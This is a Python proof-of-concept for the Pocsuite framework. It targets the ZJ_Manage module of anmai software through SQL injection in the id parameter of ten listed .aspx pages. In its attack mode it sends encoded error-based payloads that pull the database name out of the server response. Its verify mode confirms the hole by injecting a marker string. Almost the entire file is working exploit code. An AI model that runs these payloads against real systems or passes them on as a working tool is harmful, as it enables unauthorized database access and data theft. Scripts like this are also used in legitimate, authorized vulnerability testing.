#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'anmai ZJ_Manage sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=108502']
    desc = '''anmai   ZJ_Manage  打包'''

    vulDate = '2015-07-20'
    createDate = '2019-04-12'
    updateDate = '2019-04-12'

    appName = 'anmai'
    appVersion = '正式版'
    appPowerLink = 'http://www.anmai.net/'
    samples = ['re']

    url_list = ['/ZJ_Manage/Work_Man_Particular.aspx?id=1',
                '/ZJ_Manage/Class_ZjWork/Work_Plan_Particular.aspx?id=1',
                '/ZJ_Manage/Class_ZjWork/Work_Log_Particular.aspx?id=1',
                '/ZJ_Manage/Class_ZjWork/Importance_Events_Particular.aspx?id=1',
                '/ZJ_Manage/Class_ZjWork/AwardAndPunishRecord_Particular.aspx?id=1',
                '/ZJ_Manage/Zj_Record/Class_Comparison_Particular.aspx?id=1',
                '/ZJ_Manage/Zj_Record/Glory_Apply_Particular.aspx?id=1',
                '/ZJ_Manage/Zj_Record/OnDuty_ClassComparison_Particular.aspx?id=1',
                '/ZJ_Manage/Zj_Record/Server_Feedback_Particular.aspx?id=1',
                '/ZJ_Manage/Zj_Record/Zj_Record_Particular.aspx?id=1']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        for i in self.url_list:
            url = self.url.strip('/') + i
            payload = "+and+1=%28SELECT%20%20char%28126%29%2bDB_NAME()%2bchar%28126%29%29--+"
            url_p = url + payload
            resp = s.get(url_p)
            dbname = re.search('~(.*?)~', resp.content)
            if dbname:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['Database'] = {}
                result['Database']['DBname'] = dbname.group(1)
                break
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        result['VerifyInfo'] = {}
        j = 0
        for i in self.url_list:
            url = self.url.strip('/') + i
            payload = "+and+1=%28SELECT%20%20CHAR%28115%29%2bCHAR%28104%29%2bCHAR%28117%29%2bCHAR%2890%29%2bCHAR%2873%29%2bCHAR%28103%29%2bCHAR%28117%29%2bCHAR%2897%29%2bCHAR%28110%29%2bCHAR%2888%29%2bCHAR%2873%29%2bCHAR%2878%29%2bCHAR%2871%29%29--+"
            url_p = url + payload
            resp = s.get(url_p)
            time.sleep(0.5)
            if 'shuZIguanXING' in resp.content:
                result['VerifyInfo']['URL'+str(j)] = url
                j += 1
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

